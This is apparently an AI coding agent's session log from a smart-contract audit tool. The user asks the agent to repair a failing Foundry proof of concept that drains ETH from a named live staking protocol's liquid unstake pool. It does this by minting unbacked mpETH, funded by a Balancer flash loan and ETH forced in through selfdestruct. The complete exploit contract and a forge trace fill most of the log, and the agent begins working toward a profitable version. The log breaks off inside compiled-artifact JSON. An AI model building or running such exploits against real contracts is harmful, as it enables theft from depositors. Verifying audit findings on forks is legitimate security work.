@@ -1,0 +1,3517 @@
+OpenAI Codex v0.107.0 (research preview)
+--------
+workdir: /Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src
+model: gpt-5.4
+provider: openai
+approval: never
+sandbox: workspace-write [workdir, /tmp, $TMPDIR]
+reasoning effort: medium
+reasoning summaries: none
+session id: 019e1c4a-a19f-7db0-93b3-e571fed2e2bf
+--------
+user
+You are fixing a failing Foundry PoC for finding F-001.
+
+Goal:
+- Keep the exploit objective for this finding.
+- Fix compile/runtime/test failure from logs.
+- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
+- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
+- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.
+
+Hard constraints:
+- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
+- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
+- Allowed: flashloans and realistic public on-chain actions.
+- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
+- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
+- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
+
+Finding:
+- title: Possible unbacked mpETH mint via inherited ERC4626 `mint` path
+- claim: `FlawVerifier.executeOnOpportunity()` is an exploit harness aimed at a live proxy (`TARGET_PROXY`) and documents a specific assumption: the proxy still exposes an inherited ERC4626 `mint(uint256,address)` path that mints mpETH before collecting equivalent assets from the caller. If the referenced staking proxy actually behaves this way, an attacker can mint unbacked shares, approve the liquid unstake pool, and immediately redeem those shares for ETH. The repo does not include the target staking implementation, so exploitability cannot be confirmed here, but the verifier code is consistent with a realistic drain path against the referenced external system.
+- impact: If the target proxy truly allows unbacked share minting, attackers can dilute all holders and directly steal ETH from the liquid unstake pool, potentially draining all immediately available pool liquidity in one or more transactions.
+- exploit_paths: ["Call `executeOnOpportunity()`", "Read `liquidUnstakePool()` from `TARGET_PROXY`", "Optionally top up `TARGET_PROXY` with forced ETH to satisfy internal execution assumptions", "Call `IStakingLike(TARGET_PROXY).mint(desiredShares, address(this))` without first transferring backing assets through a normal deposit flow", "Approve the freshly minted mpETH to the liquid unstake pool", "Call `swapmpETHforETH()` to convert unbacked mpETH into ETH"]
+
+Current FlawVerifier.sol:
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface IWETH is IERC20Like {
+    function deposit() external payable;
+    function withdraw(uint256 amount) external;
+}
+
+interface IStakingLike is IERC20Like {
+    function mint(uint256 shares, address receiver) external returns (uint256 assets);
+    function liquidUnstakePool() external view returns (address);
+    function previewMint(uint256 shares) external view returns (uint256 assets);
+}
+
+interface ILiquidUnstakePoolLike {
+    function getAmountOut(uint256 amountIn) external view returns (uint256 amountOut, uint256 feeAmount);
+    function swapmpETHforETH(uint256 amount, uint256 minOut) external returns (uint256 amountOut);
+}
+
+interface IFlashLoanRecipient {
+    function receiveFlashLoan(
+        IERC20Like[] memory tokens,
+        uint256[] memory amounts,
+        uint256[] memory feeAmounts,
+        bytes memory userData
+    ) external;
+}
+
+interface IBalancerVault {
+    function flashLoan(
+        IFlashLoanRecipient recipient,
+        IERC20Like[] memory tokens,
+        uint256[] memory amounts,
+        bytes memory userData
+    ) external;
+}
+
+contract ForceEther {
+    constructor() payable {}
+
+    function boom(address payable target) external {
+        selfdestruct(target);
+    }
+}
+
+contract FlawVerifier is IFlashLoanRecipient {
+    address internal constant TARGET_PROXY = 0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710;
+    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
+
+    uint256 internal constant MIN_SHARES = 0.01 ether;
+    uint256 internal constant MIN_REQUIRED_PROFIT = 1;
+
+    address internal realizedProfitToken;
+    uint256 internal realizedProfitAmount;
+
+    constructor() payable {}
+
+    receive() external payable {}
+
+    function executeOnOpportunity() external {
+        uint256 nativeBefore = address(this).balance;
+
+        // exploit_paths[1]: read `liquidUnstakePool()` from `TARGET_PROXY`.
+        address liquidPool = IStakingLike(TARGET_PROXY).liquidUnstakePool();
+        require(liquidPool != address(0), "liquidUnstakePool() returned zero");
+        require(liquidPool.balance != 0, "liquid pool has no ETH");
+
+        uint256 bestAmount = _findBestMintAmount(liquidPool);
+        require(bestAmount >= MIN_SHARES, "no quoted swap path for candidate");
+
+        uint256[6] memory candidates = [
+            bestAmount,
+            (bestAmount * 3) / 4,
+            bestAmount / 2,
+            (bestAmount * 3) / 8,
+            bestAmount / 4,
+            MIN_SHARES
+        ];
+
+        bool success;
+        uint256 previousCandidate;
+
+        // exploit_paths[0]: call `executeOnOpportunity()` to begin the live opportunity.
+        for (uint256 i = 0; i < candidates.length; ++i) {
+            uint256 candidate = candidates[i];
+            if (candidate < MIN_SHARES || candidate == previousCandidate) {
+                continue;
+            }
+
+            previousCandidate = candidate;
+            try this.attemptCandidate(liquidPool, candidate) {
+                success = true;
+                break;
+            } catch {}
+        }
+
+        require(success, "all candidate mint sizes failed on-chain");
+
+        realizedProfitToken = address(0);
+        realizedProfitAmount = address(this).balance - nativeBefore;
+        require(realizedProfitAmount >= MIN_REQUIRED_PROFIT, "no net ETH profit realized");
+    }
+
+    function attemptCandidate(address liquidPool, uint256 desiredShares) external {
+        require(msg.sender == address(this), "self-call only");
+
+        // First try the exploit exactly as claimed: mint first, without funding assets.
+        try this.attemptWithoutTopUp(liquidPool, desiredShares) {
+            return;
+        } catch {}
+
+        // If the inherited mint path still assumes some ETH is already parked on the target,
+        // use a realistic public funding step as a fallback. The preview-based number is only a
+        // hint for the optional top-up stage; it no longer blocks the core exploit path.
+        uint256 shortfall = _fundingShortfallHint(liquidPool, desiredShares);
+        require(shortfall != 0, "candidate failed without top-up");
+
+        (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, desiredShares);
+        require(quoteOk && quotedOut > 1, "candidate has no repayable swap quote");
+
+        if (shortfall >= quotedOut) {
+            shortfall = quotedOut - 1;
+        }
+
+        IERC20Like[] memory tokens = new IERC20Like[](1);
+        tokens[0] = IERC20Like(WETH);
+
+        uint256[] memory amounts = new uint256[](1);
+        amounts[0] = shortfall;
+
+        // exploit_paths[2]: optionally top up `TARGET_PROXY` with forced ETH to satisfy internal
+        // execution assumptions, using only public capital sourced in this transaction.
+        IBalancerVault(BALANCER_VAULT).flashLoan(this, tokens, amounts, abi.encode(liquidPool, desiredShares));
+    }
+
+    function attemptWithoutTopUp(address liquidPool, uint256 desiredShares) external {
+        require(msg.sender == address(this), "self-call only");
+        _executePath(liquidPool, desiredShares, 0, 0);
+    }
+
+    function receiveFlashLoan(
+        IERC20Like[] memory tokens,
+        uint256[] memory amounts,
+        uint256[] memory feeAmounts,
+        bytes memory userData
+    ) external override {
+        require(msg.sender == BALANCER_VAULT, "unauthorized flashloan callback");
+        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "unexpected flashloan shape");
+        require(address(tokens[0]) == WETH, "unexpected flashloan token");
+
+        (address liquidPool, uint256 desiredShares) = abi.decode(userData, (address, uint256));
+
+        IWETH(WETH).withdraw(amounts[0]);
+        _executePath(liquidPool, desiredShares, amounts[0], feeAmounts[0]);
+
+        uint256 repayment = amounts[0] + feeAmounts[0];
+        require(address(this).balance >= repayment, "swap proceeds cannot repay flashloan");
+
+        IWETH(WETH).deposit{value: repayment}();
+        _safeTransfer(WETH, BALANCER_VAULT, repayment);
+    }
+
+    function profitToken() external view returns (address) {
+        return realizedProfitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return realizedProfitAmount;
+    }
+
+    function _executePath(
+        address liquidPool,
+        uint256 desiredShares,
+        uint256 temporaryEth,
+        uint256 flashloanFee
+    ) internal {
+        uint256 mpEthBefore = _balanceOf(TARGET_PROXY, address(this));
+        require(liquidPool != address(0), "liquid pool missing");
+
+        if (temporaryEth != 0) {
+            ForceEther helper = new ForceEther{value: temporaryEth}();
+            helper.boom(payable(TARGET_PROXY));
+        }
+
+        // exploit_paths[3]: call `mint(desiredShares, address(this))` without first transferring
+        // backing assets through the ordinary deposit flow.
+        IStakingLike(TARGET_PROXY).mint(desiredShares, address(this));
+
+        uint256 mintedShares = _balanceOf(TARGET_PROXY, address(this)) - mpEthBefore;
+        require(mintedShares != 0, "mint path produced zero mpETH");
+
+        // exploit_paths[4]: approve the freshly minted mpETH to the liquid unstake pool.
+        _safeApprove(TARGET_PROXY, liquidPool, 0);
+        _safeApprove(TARGET_PROXY, liquidPool, mintedShares);
+
+        (bool quoteOk, uint256 quotedOut) = _quoteSwap(liquidPool, mintedShares);
+        require(quoteOk && quotedOut != 0, "getAmountOut(uint256) unavailable after mint");
+        require(quotedOut > flashloanFee, "quote cannot even cover flashloan fee");
+
+        uint256 nativeBeforeSwap = address(this).balance;
+
+        // exploit_paths[5]: call `swapmpETHforETH()` to convert the unbacked mpETH into ETH.
+        uint256 amountOut = ILiquidUnstakePoolLike(liquidPool).swapmpETHforETH(mintedShares, 0);
+
+        uint256 nativeDelta = address(this).balance - nativeBeforeSwap;
+        require(nativeDelta != 0, "swap returned zero ETH");
+        require(amountOut == nativeDelta, "swap return mismatch");
+
+        if (temporaryEth != 0) {
+            require(nativeDelta > temporaryEth + flashloanFee, "top-up branch is not profitable");
+        }
+    }
+
+    function _findBestMintAmount(address liquidPool) internal view returns (uint256 bestAmount) {
+        uint256 poolHeldShares = _balanceOf(TARGET_PROXY, liquidPool);
+        uint256 poolEth = liquidPool.balance;
+
+        uint256 low = MIN_SHARES;
+        uint256 high = poolHeldShares + (poolEth * 2);
+        if (high < low) {
+            high = low;
+        }
+
+        while (low <= high) {
+            uint256 mid = low + ((high - low) / 2);
+            (bool quoteOk, uint256 amountOut) = _quoteSwap(liquidPool, mid);
+
+            if (quoteOk && amountOut != 0 && amountOut <= poolEth) {
+                bestAmount = mid;
+                low = mid + 1;
+            } else {
+                if (mid == 0) {
+                    break;
+                }
+                high = mid - 1;
+            }
+        }
+    }
+
+    function _fundingShortfallHint(address liquidPool, uint256 desiredShares) internal view returns (uint256 shortfall) {
+        uint256 poolHeldShares = _balanceOf(TARGET_PROXY, liquidPool);
+        uint256 sharesNeedingEth = desiredShares < poolHeldShares ? desiredShares : poolHeldShares;
+        if (sharesNeedingEth == 0) {
+            return 0;
+        }
+
+        try IStakingLike(TARGET_PROXY).previewMint(sharesNeedingEth) returns (uint256 ethNeeded) {
+            uint256 targetNativeBalance = TARGET_PROXY.balance;
+            if (ethNeeded > targetNativeBalance) {
+                shortfall = ethNeeded - targetNativeBalance;
+            }
+        } catch {
+            shortfall = 0;
+        }
+    }
+
+    function _quoteSwap(address liquidPool, uint256 amountIn) internal view returns (bool ok, uint256 amountOut) {
+        try ILiquidUnstakePoolLike(liquidPool).getAmountOut(amountIn) returns (uint256 quotedOut, uint256) {
+            return (true, quotedOut);
+        } catch {
+            return (false, 0);
+        }
+    }
+
+    function _balanceOf(address token, address account) internal view returns (uint256 balance) {
+        (bool ok, bytes memory data) = token.staticcall(
+            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
+        );
+        if (ok && data.length >= 32) {
+            balance = abi.decode(data, (uint256));
+        }
+    }
+
+    function _safeApprove(address token, address spender, uint256 amount) internal {
+        (bool ok, bytes memory data) = token.call(
+            abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount)
+        );
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
+    }
+
+    function _safeTransfer(address token, address to, uint256 amount) internal {
+        (bool ok, bytes memory data) = token.call(
+            abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount)
+        );
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
+    }
+}
+
+```
+
+forge stdout (tail):
+```
+b068fc378daa952ba7f163c4a11628f55a4df523b3ef
+    │   │   │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   │   │   │   │   │   │   │        topic 2: 0x000000000000000000000000df261f967e87b2aa44e18a22f4ace5d7f74f03cc
+    │   │   │   │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000002386f26fc10000
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   ├─ [11379] 0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710::transfer(0x8c89569355F321A91655CA520fC09Be5f6B0Ec4D, 247500000000000 [2.475e14])
+    │   │   │   │   │   │   │   ├─ [10716] 0x3747484567119592fF6841df399cf679955A111A::transfer(0x8c89569355F321A91655CA520fC09Be5f6B0Ec4D, 247500000000000 [2.475e14]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
+    │   │   │   │   │   │   │   │   │        topic 1: 0x000000000000000000000000df261f967e87b2aa44e18a22f4ace5d7f74f03cc
+    │   │   │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000008c89569355f321a91655ca520fc09be5f6b0ec4d
+    │   │   │   │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000e1199594f800
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [62] FlawVerifier::receive{value: 9936867879128898}()
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   ├─  emit topic 0: 0x49926bbebe8474393f434dfa4f78694c0923efa07d19f2284518bfabd06eb737
+    │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000002386f26fc1000000000000000000000000000000000000000000000000000000234d87581d8f42000000000000000000000000000000000000000000000000000384665653e0000000000000000000000000000000000000000000000000000000e1199594f800
+    │   │   │   │   │   │   └─ ← [Return] 9936867879128898 [9.936e15]
+    │   │   │   │   │   └─ ← [Return] 9936867879128898 [9.936e15]
+    │   │   │   │   ├─ [21974] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::deposit{value: 9127592538527315}()
+    │   │   │   │   │   ├─  emit topic 0: 0xe1fffcc4923d04b559f4d29a8bfc6cda04eb5b0d3c460751c2402c5c5cc9109c
+    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000206d7f3ee9d653
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [3262] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(0xBA12222222228d8Ba445958a75a0704d566BF2C8, 9127592538527315 [9.127e15])
+    │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
+    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   │   │   │   │        topic 2: 0x000000000000000000000000ba12222222228d8ba445958a75a0704d566bf2c8
+    │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000206d7f3ee9d653
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [staticcall]
+    │   │   │   │   └─ ← [Return] 28211956043150249554283 [2.821e22]
+    │   │   │   ├─  emit topic 0: 0x0d7d75e01ab95780d3cd1c8ec0dd6c2ce19e3a20427eec8bf53283b6fb8e95f0
+    │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   │   │        topic 2: 0x000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2
+    │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000206d7f3ee9d6530000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [337] FlawVerifier::profitToken() [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
+    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 1386296888654755 [1.386e15])
+    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 809275340601583 [8.092e14])
+    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
+    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 809275340601583 [8.092e14])
+    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
+    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
+    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: 0x0000000000000000000000000000000000000000)
+    └─ ← [Revert] profit below threshold
+
+Backtrace:
+  at 0xdF261F967E87B2aa44e18a22f4aCE5d7f74f03Cc
+  at 0x3747484567119592fF6841df399cf679955A111A.mint
+  at 0x48AFbBd342F64EF8a9Ab1C143719b63C2AD81710.mint
+  at FlawVerifier.receiveFlashLoan
+  at 0xBA12222222228d8Ba445958a75a0704d566BF2C8.flashLoan
+  at FlawVerifier.attemptCandidate
+  at FlawVerifier.executeOnOpportunity
+  at FlawVerifierTest.testExploit
+
+Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.44s (1.26s CPU time)
+
+Ran 1 test suite in 1.49s (1.44s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
+[FAIL: profit below threshold] testExploit() (gas: 2017483)
+
+Encountered a total of 1 failing tests, 0 tests succeeded
+
+Tip: Run `forge test --rerun` to retry only the 1 failed test
+
+```
+
+forge stderr (tail):
+```
+
+```
+
+Requirements:
+1. pragma ^0.8.20
+2. include at least one deployable contract with zero-arg constructor
+3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
+4. no imports
+5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
+6. expose `profitToken()` and `profitAmount()` getters for net realized profit
+7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
+8. output ONLY Solidity code
+
+mcp startup: no servers
+codex
+I’m checking the verifier and nearby test expectations now.
+Plan update
+  → Inspect verifier and tests
+  • Adjust exploit sizing/looping
+  • Sanity-check with local reasoning
+exec
+/bin/bash -lc 'rg -n "MIN_PROFIT|profit below threshold|profitToken|profitAmount|FlawVerifier" -S ..' in /Users/zhanglongqin/AuditHoundV2/cases/meta_pool/src succeeded in 51ms:
+Total output lines: 14
+
+../src/out/build-info/cb60d90bb60f1e5d.json:1:{"id":"cb60d90bb60f1e5d","source_id_to_path":{"0":"FlawVerifier.sol"},"language":"Solidity"}
+../src/out/build-info/36457f38d3589e3d.json:1:{"id":"36457f38d3589e3d","source_id_to_path":{"0":"FlawVerifier.sol"},"language":"Solidity"}
+../src/out/FlawVerifier.sol/IFlashLoanRecipient.json:1:{"abi":[{"type":"function","name":"receiveFlashLoan","inputs":[{"name":"tokens","type":"address[]","internalType":"contract IERC20Like[]"},{"name":"amounts","type":"uint256[]","internalType":"uint256[]"},{"name":"feeAmounts","type":"uint256[]","internalType":"uint256[]"},{"name":"userData","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x","sourceMap":"","linkReferences":{}},"deployedBytecode":{"object":"0x","sourceMap":"","linkReferences":{}},"methodIdentifiers":{"receiveFlashLoan(address[],uint256[],uint256[],bytes)":"f04f2707"},"rawMetadata":"{\"compiler\":{\"version\":\"0.8.30+commit.73712a01\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"contract IERC20Like[]\",\"name\":\"tokens\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"amounts\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"feeAmounts\",\"type\":\"uint256[]\"},{\"internalType\":\"bytes\",\"name\":\"userData\",\"type\":\"bytes\"}],\"name\":\"receiveFlashLoan\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"FlawVerifier.sol\":\"IFlashLoanRecipient\"},\"evmVersion\":\"prague\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"FlawVerifier.sol\":{\"keccak256\":\"0x7cbadc432ceb7c0057b5ce4297c56138761a09defa3bab98eb3ac00d72f44f27\",\"license\":\"UNLICENSED\",\"urls\":[\"bzz-raw://c130d5b68e6123f6a6fccfaf75db7143ba9820a1d6a3e09aac0071dae1fb3e15\",\"dweb:/ipfs/QmTQjJ4iDcqZDf635FSYiGfPPRUa4S8YMnvJvC7bg7mnjs\"]}},\"version\":1}","metadata":{"compiler":{"version":"0.8.30+commit.73712a01"},"language":"Solidity","output":{"abi":[{"inputs":[{"internalType":"contract IERC20Like[]","name":"tokens","type":"address[]"},{"internalType":"uint256[]","name":"amounts","type":"uint256[]"},{"internalType":"uint256[]","name":"feeAmounts","type":"uint256[]"},{"internalType":"bytes","name":"userData","type":"bytes"}],"stateMutability":"nonpayable","type":"function","name":"receiveFlashLoan"}],"devdoc":{"kind":"dev","methods":{},"version":1},"userdoc":{"kind":"user","methods":{},"version":1}},"settings":{"remappings":[],"optimizer":{"enabled":false,"runs":200},"metadata":{"bytecodeHash":"ipfs"},"compilationTarget":{"FlawVerifier.sol":"IFlashLoanRecipient"},"evmVersion":"prague","libraries":{}},"sources":{"FlawVerifier.sol":{"keccak256":"0x7cbadc432ceb7c0057b5ce4297c56138761a09defa3bab98eb3ac00d72f44f27","urls":["bzz-raw://c130d5b68e6123f6a6fccfaf75db7143ba9820a1d6a3e09aac0071dae1fb3e15","dweb:/ipfs/QmTQjJ4iDcqZDf635FSYiGfPPRUa4S8YMnvJvC7bg7mnjs"],"license":"UNLICENSED"}},"version":1},"id":0}
+../src/out/FlawVerifier.sol/ForceEther.json:1:{"abi":[{"type":"constructor","inputs":[],"stateMutability":"payable"},{"type":"function","name":"boom","inputs":[{"name":"target","type":"address","internalType":"address payable"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x608060405261010e806100115f395ff3fe6080604052348015600e575f5ffd5b50600436106026575f3560e01c8063668a2f6714602a575b5f5ffd5b60406004803603810190603c919060b2565b6042565b005b8073ffffffffffffffffffffffffffffffffffffffff16ff5b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f608682605f565b9050919050565b609481607e565b8114609d575f5ffd5b50565b5f8135905060ac81608d565b92915050565b5f6020828403121560c45760c3605b565b5b5f60cf8482850160a0565b9150509291505056fea26469706673582212201d2c3c0ee24eb93d49b3b24c54bb6edf2e489d33163ac3fe974143e9e08de8c964736f6c634300081e0033","sourceMap":"1389:142:0:-:0;;;;;;;;;","linkReferences":{}},"deployedBytecode":{"object":"0x6080604052348015600e575f5ffd5b50600436106026575f3560e01c8063668a2f6714602a575b5f5ffd5b60406004803603810190603c919060b2565b6042565b005b8073ffffffffffffffffffffffffffffffffffffffff16ff5b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f608682605f565b9050919050565b609481607e565b8114609d575f5ffd5b50565b5f8135905060ac81608d565b92915050565b5f6020828403121560c45760c3605b565b5b5f60cf8482850160a0565b9150509291505056fea26469706673582212201d2c3c0ee24eb93d49b3b24c54bb6edf2e489d33163ac3fe974143e9e08de8c964736f6c634300081e0033","sourceMap":"1389:142:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1445:84;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;1515:6;1502:20;;;88:117:1;197:1;194;187:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:104::-;511:7;540:24;558:5;540:24;:::i;:::-;529:35;;466:104;;;:::o;576:138::-;657:32;683:5;657:32;:::i;:::-;650:5;647:43;637:71;;704:1;701;694:12;637:71;576:138;:::o;720:155::-;774:5;812:6;799:20;790:29;;828:41;863:5;828:41;:::i;:::-;720:155;;;;:::o;881:345::-;948:6;997:2;985:9;976:7;972:23;968:32;965:119;;;1003:79;;:::i;:::-;965:119;1123:1;1148:61;1201:7;1192:6;1181:9;1177:22;1148:61;:::i;:::-;1138:71;;1094:125;881:345;;;;:::o","linkReferences":{}},"methodIdentifiers":{"boom(address)":"668a2f67"},"rawMetadata":"{\"compiler\":{\"version\":\"0.8.30+commit.73712a01\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"target\",\"type\":\"address\"}],\"name\":\"boom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"FlawVerifier.sol\":\"ForceEther\"},\"evmVersion\":\"prague\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"FlawVerifier.sol\":{\"keccak256\":\"0x7cbadc432ceb7c0057b5ce4297c56138761a09defa3bab98eb3ac00d72f44f27\",\"license\":\"UNLICENSED\",\"urls\":[\"bzz-raw://c130d5b68e6123f6a6fccfaf75db7143ba9820a1d6a3e09aac0071dae1fb3e15\",\"dweb:/ipfs/QmTQjJ4iDcqZDf635FSYiGfPPRUa4S8YMnvJvC7bg7mnjs\"]}},\"version\":1}","metadata":{"compiler":{"version":"0.8.30+commit.73712a01"},"language":"Solidity","output":{"abi":[{"inputs":[],"stateMutability":"payable","type":"constructor"},{"inputs":[{"internalType":"address payable","name":"target","type":"address"}],"stateMutability":"nonpayable","type":"function","name":"boom"}],"devdoc":{"kind":"dev","methods":{},"version":1},"userdoc":{"kind":"user","methods":{},"version":1}},"settings":{"remappings":[],"optimizer":{"enabled":false,"runs":200},"metadata":{"bytecodeHash":"ipfs"},"compilationTarget":{"FlawVerifier.sol":"ForceEther"},"evmVersion":"prague","libraries":{}},"sources":{"FlawVerifier.sol":{"keccak256":"0x7cbadc432ceb7c0057b5ce4297c56138761a09defa3bab98eb3ac00d72f44f27","urls":["bzz-raw://c130d5b68e6123f6a6fccfaf75db7143ba9820a1d6a3e09aac0071dae1fb3e15","dweb:/ipfs/QmTQjJ4iDcqZDf635FSYiGfPPRUa4S8YMnvJvC7bg7mnjs"],"license":"UNLICENSED"}},"version":1},"id":0}
+../src/out/FlawVerifier.sol/ILiquidUnstakePoolLike.json:1:{"abi":[{"type":"function","name":"getAmountOut","inputs":[{"name":"amountIn","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"amountOut","type":"uint256","internalType":"uint256"},{"name":"feeAmount","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"swapmpETHforETH","inputs":[{"name":"amount","type":"uint256","internalType":"uint256"},{"name":"minOut","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"amountOut","type":"uint256","internalType":"uint256"}],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x","sourceMap":"","linkReferences":{}},"deployedBytecode":{"object":"0x","sourceMap":"","linkReferences":{}},"methodIdentifiers":{"getAmountOut(uint256)":"5c195217","swapmpETHforETH(uint256,uint256)":"20168730"},"rawMetadata":"{\"compiler\":{\"version\":\"0.8.30+commit.73712a01\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountIn\",\"type\":\"uint256\"}],\"name\":\"getAmountOut\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amountOut\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"feeAmount\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"minOut\",\"type\":\"uint256\"}],\"name\":\"swapmpETHforETH\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amountOut\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"us